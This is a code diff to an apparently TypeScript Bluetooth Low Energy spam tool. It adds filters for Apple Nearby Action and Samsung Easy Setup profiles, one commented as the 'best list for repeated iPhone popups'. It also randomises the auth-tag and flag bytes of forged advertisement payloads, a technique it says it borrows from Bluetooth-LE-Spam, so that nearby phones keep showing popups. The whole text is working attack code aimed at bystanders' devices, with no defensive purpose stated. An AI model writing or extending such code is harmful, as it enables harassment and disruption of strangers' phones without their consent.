@@ -137,17 +137,41 @@ export function getBroadcastableProfiles(): ManufacturerProfile[] {
   );
 }
 
+/** Apple Nearby Action only — best list for repeated iPhone popups. */
+export function getAppleNearbyProfiles(): ManufacturerProfile[] {
+  return BLE_PROFILES.filter(
+    (p): p is ManufacturerProfile =>
+      p.kind === 'manufacturer' && p.advertiseMode === 'continuity-nearby-action'
+  );
+}
+
+/** Samsung Easy Setup only. */
+export function getSamsungProfiles(): ManufacturerProfile[] {
+  return BLE_PROFILES.filter(
+    (p): p is ManufacturerProfile =>
+      p.kind === 'manufacturer' &&
+      p.advertiseMode === 'static' &&
+      p.companyId === 0x0075
+  );
+}
+
 /**
  * Build the exact manufacturer payload to put on the air.
- * Nearby Action gets a fresh 3-byte auth tag each call.
+ * Nearby Action: random auth tag + flag variants (same trick Bluetooth-LE-Spam uses).
  */
 export function buildAdvertisePayload(profile: ManufacturerProfile): number[] {
   if (profile.advertiseMode === 'continuity-nearby-action') {
     const action = profile.actionByte ?? profile.payload[3] ?? 0x09;
+    let flag = 0xc0;
+    // Flag jitter from Bluetooth-LE-Spam ContinuityActionModalAdvertisementSetGenerator
+    if (action === 0x20 && Math.random() < 0.5) flag = 0xbf;
+    if (action === 0x09 && Math.random() < 0.5) flag = 0x40;
+    if (action === 0x21) flag = 0x40;
+
     return [
       0x0f,
       0x05,
-      0xc0,
+      flag,
       action,
       Math.floor(Math.random() * 256),
       Math.floor(Math.random() * 256),
